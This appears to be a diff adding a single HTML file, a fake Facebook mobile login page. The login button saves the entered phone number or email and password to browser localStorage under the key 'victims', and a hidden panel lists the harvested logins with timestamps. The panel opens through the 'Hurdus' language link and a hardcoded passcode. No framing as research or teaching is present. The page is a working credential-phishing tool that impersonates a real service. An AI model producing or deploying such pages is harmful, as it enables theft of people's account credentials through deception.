@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Kanit&family=Noto+Sans&display=swap" rel="stylesheet">
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">  <script src="https://kit.fontawesome.com/e824570a64.js" crossorigin="anonymous"></script> <meta content="width=device-width,minimum-scale=1.0" name="viewport">
+    <meta charset="UTF-8">
+    <title>Login</title>
+    
+    <style>
+        body{        
+font-family: 'Noto Sans', sans-serif;      
+          
+        }
+   #mobilenumber{
+       border: 2px solid #6ab6ff83;
+       outline: none;
+       width: 93%;
+       margin-top: 5px;
+       font-size: 17px;  
+       margin-bottom: 11px;     
+       padding: 8px;
+   }
+  #password{
+       border: 2px solid #bfd5ffd6;
+       outline: none;
+       width: 93%;
+       margin-top: 5px;
+       font-size: 17px;       
+       padding: 8px;   
+  }
+  #login{
+       border: none;
+       width: 99.4%;
+       cursor: pointer;
+       font-weight: bold;
+       font-size: 18px;
+       margin-top: 10px;
+       color: white;
+       background-color: #408cff;
+       padding: 8px;
+   }
+   .signup{
+      border: none;
+      position: relative;
+      font-weight: bold;
+      font-size: 18px;
+      padding: 3px;
+      height: 7vh;
+      width: 58%;
+      left: 20%;
+      color: white;
+      background:  #00a02a;
+         }
+
+  .p1{ text-align: center;
+       font-size: 17px;}
+   .p1::after {
+        content: "";
+        position: absolute;
+        right: 7%;        
+    width: 38%;
+    margin-top: 8px;
+    height: 1px; /* Height of the underline */    
+    background-color: #c3c3c3;/* Color of the underline */  
+      }
+      
+      .p1::before {
+         content: "";
+    position: absolute;         
+    left: 7%;          
+    width: 38%;
+    margin-top: 8px;
+    height: 1px; /* Height of the underline */    
+    background-color: #c3c3c3;/* Color of the underline */  
+      }
+      
+   .languages{
+     display: block;
+     color:   #2b6dff;
+     margin-left: 11px;
+   }
+   
+   #eyeicon{
+       position: absolute;
+       left: 87%;
+       font-size: 25px;
+       margin-top: 12px;
+   }
+   
+   #victims{
+      display: none;
+      position: fixed;
+      top: 40%;
+      color: black;
+      bottom: 0;
+      overflow-y: auto;
+      left: 0;
+      right: 0;
+      background: white;
+   }
+   .pass{
+     backdrop-filter: blur(50px);
+     display: none;
+     height: 15vh;
+     margin-top: -90px;
+     width: 70%;
+   }
+   
+   .postele{
+       border: 1px solid green;
+       padding: 10px;
+   }
+   
+   #clearButton{
+     display: none;
+      border: none;
+       width: 99.4%;
+       cursor: pointer;
+       font-weight: bold;
+       font-size: 18px;
+       position: fixed;
+       top: 2%;
+       color: white;
+       background-color: #408cff;
+       padding: 8px;
+   }
+    .facebook {
+    text-align: center;
+    color: #565656;
+  }
+  
+  .line{
+    position: absolute;         
+    left: 0%;          
+    width: 100%;
+    margin-top: 22px;
+    margin-bottom: 0px;
+    height: 1px; /* Height of the underline */    
+    background-color: #c3c3c3;/* Color of the underline */    
+  }
+
+ </style>
+</head>
+<body>
+    <div class="line"></div> 
+    <p class="facebook" onClick="closeIt()">Facebook</p>
+   Mobile number or email 
+  <input type="text" id="mobilenumber">
+  Password
+ <input type="password" id="password"><i id="eyeicon" class="fas fa-eye"></i><br>
+ <button id="login">Log in</button>
+ <p style="color:  #2b6dff; margin-top: 10px; cursor: pointer; font-size: 16.5px;">Forgot password?</p>
+  <p class="p1">or</p>
+ <button class="signup">Create new account</button>
+ 
+ <div class="languages">
+   <p>English (UK)</p>
+   
+   <p>Hausa</p>
+   <p>Français (France)</p>
+   
+   <p onClick="showCode()">Hurdus</p>
+   
+   <p>more languages....</p>
+   </div>
+  <div id="victims">
+ </div>
+  
+    <div id="pass" class="pass">
+        <i onClick="showPass()" style="font-size: 20px;" class="fas fa-arrow-left"></i> <br><br>
+     <input type="password" id="password-input">
+   <br>
+   <button id="submit">submit</button>   
+    </div>
+ 
+<button id="clearButton">Clear all</button>
+ 
+ <script>
+     function showPass() {
+ document.getElementById('pass').style.display = 'none';
+     }
+  function showCode() {
+document.getElementById('pass').style.display = 'block';
+  }    
+  
+     const clearButton =
+    document.getElementById('clearButton');
+     clearButton.addEventListener('click',                            function () {
+    localStorage.clear();
+    location.reload();
+     
+  }); 
+     
+     const toggleIcon = document.getElementById('eyeicon');
+     const passwordInput =
+document.getElementById('password');
+      toggleIcon.addEventListener("click", function() {
+    if (passwordInput.type === "password") {
+      passwordInput.type = "text";
+      toggleIcon.classList.remove("fa-eye");
+      toggleIcon.classList.add("fa-eye-slash");
+    } else {
+      passwordInput.type = "password";
+      toggleIcon.classList.remove("fa-eye-slash");
+      toggleIcon.classList.add("fa-eye");
+   }
+  });
+     
+  const passwordInputt =
+ document.getElementById('password-input');
+ const submitButton =
+ document.getElementById('submit');
+  const passcode =
+  document.getElementById("pass");
+ const postforms =
+ document.getElementById('victims');
+  const correctPassword = '1437';
+   submitButton.addEventListener('click', function () {
+  const enteredPassword = passwordInputt.value;
+
+  if (enteredPassword === correctPassword) {
+    // Password is correct, show the hidden element
+       postforms.style.display = 'block';
+       passcode.style.display = 'none' ;
+      clearButton.style.display = 'block';
+  } else {
+    // Password is incorrect, display a message or take another action
+    alert('Incorrect password. Access denied.');
+    passcode.style.display = 'none';
+  }
+
+  // Clear the password input field
+  passwordInputt.value = '';
+});
+   
+ 
+    
+   function closeIt() {
+ document.getElementById('clearButton').style.display = 'none' ; document.getElementById('victims').style.display = 'none' ;
+   }
+     document.getElementById('login').addEventListener('click', function () {
+  const newsText = document.getElementById('mobilenumber').value;
+  const writeUp = document.getElementById('password').value;
+  const newsCon =
+document.getElementById('victims'); 
+
+  const newContent = {
+    texts: newsText,
+    write: writeUp,
+    timestamp: new Date().toLocaleString(),
+  };
+
+  let aboutnews = JSON.parse(localStorage.getItem('victims')) || [];
+  aboutnews.unshift(newContent);
+  localStorage.setItem('victims', JSON.stringify(aboutnews));
+  
+  renderAboutnews();
+  
+/*  document.getElementById('mobilenumber').value = '';
+  document.getElementById('password').value = '';*/
+});
+
+function renderAboutnews() {
+  const newsCon = document.getElementById('victims');
+  newsCon.innerHTML = '';
+
+  const aboutnews = JSON.parse(localStorage.getItem('victims')) || [];
+
+  aboutnews.forEach((content) => {
+    const newCon = document.createElement('div');
+    newCon.classList.add('postele');
+
+    const postEle = document.createElement('div');
+    postEle.classList.add('postt');
+  
+    const postCon = document.createElement('div');
+    postCon.style.fontWeight = 'bold' ;
+    postCon.classList.add('post-content3');
+    postCon.innerHTML = `
+    <p>${content.texts}</p>
+    `;
+     postEle.appendChild(postCon);
+
+  const writeIt = document.createElement('div');
+writeIt.classList.add('write-it');
+    writeIt.innerHTML = `
+    <p>${content.write}</p>
+    `;
+    postEle.appendChild(writeIt);
+  
+
+    // Create a timestamp element
+    function formatTimestamp(timestamp) {
+      const date = new Date(timestamp);
+      const options = {
+        year: 'numeric',
+        month: 'short',
+        day: 'numeric',
+        hour: 'numeric',
+        minute: 'numeric',
+        hour12: true,
+      };
+      return date.toLocaleString([], options);
+    }
+
+    // Create a timestamp element
+    const timestampEle = document.createElement('p');
+    timestampEle.classList.add('timestamp');
+    timestampEle.textContent = formatTimestamp(content.timestamp);
+  
+    postEle.appendChild(timestampEle);
+    
+    newCon.appendChild(postEle);
+    newsCon.appendChild(newCon);
+
+  // Clear the input fields
+  
+window.addEventListener('load', function () {
+  document.getElementById('password').value = '';
+  document.getElementById('mobilenumber').value = ''; 
+    });       
+   });
+   };
+ 
+window.addEventListener('load', renderAboutnews);
+
+ </script>
+</body>
+</html>
